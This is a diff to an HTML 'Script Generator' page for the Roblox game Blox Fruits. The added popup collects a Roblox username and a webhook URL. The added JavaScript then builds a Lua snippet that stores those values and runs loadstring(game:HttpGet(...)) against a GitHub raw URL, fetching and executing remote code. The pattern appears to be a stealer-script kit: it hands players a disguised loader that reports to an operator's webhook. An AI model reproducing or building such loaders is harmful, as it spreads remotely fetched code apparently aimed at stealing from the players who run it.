@@ -32,30 +32,65 @@
             background: #ff0080;
             color: white;
             border: none;
-            padding: 15px 30px;
-            font-size: 1.2rem;
+            padding: 10px 20px;
+            font-size: 1rem;
             border-radius: 10px;
             cursor: pointer;
             transition: transform 0.3s, background 0.3s;
+            width: 200px;
         }
         .game-button:hover {
             background: #ff0055;
             transform: scale(1.1);
         }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #1e1e2e;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+        .popup input {
+            display: block;
+            margin: 10px 0;
+            padding: 5px;
+            width: 90%;
+        }
+        .popup button {
+            background: #ff0080;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
     <h1>Script Generator</h1>
     <div class="container">
-        <button class="game-button">Pet Simulator 99</button>
-        <button class="game-button">Murder Mystery 2</button>
-        <button class="game-button">Blox Fruits</button>
-        <button class="game-button">Adopt Me</button>
-        <button class="game-button">Pls Donate</button>
-    </div>
+        <button class="game-button" onclick="openPopup('Blox Fruits')">Blox Fruits</button>
+    </div><div id="popup" class="popup">
+    <h2>Enter Details</h2>
+    <input type="text" id="username" placeholder="Enter Roblox Username">
+    <input type="text" id="webhook" placeholder="Enter Webhook URL">
+    <button onclick="generateScript()">Generate Script</button>
+</div>
+
+<script>
+    function openPopup(game) {
+        document.getElementById('popup').style.display = 'block';
+    }
+    function generateScript() {
+        let username = document.getElementById('username').value;
+        let webhook = document.getElementById('webhook').value;
+        let script = `Username = "${username}"
+
+Webhook = "${webhook}" loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Bloxfruits'))()`; alert("Generated Script:\n" + script); document.getElementById('popup').style.display = 'none'; } </script>
+
 </body>
 </html>
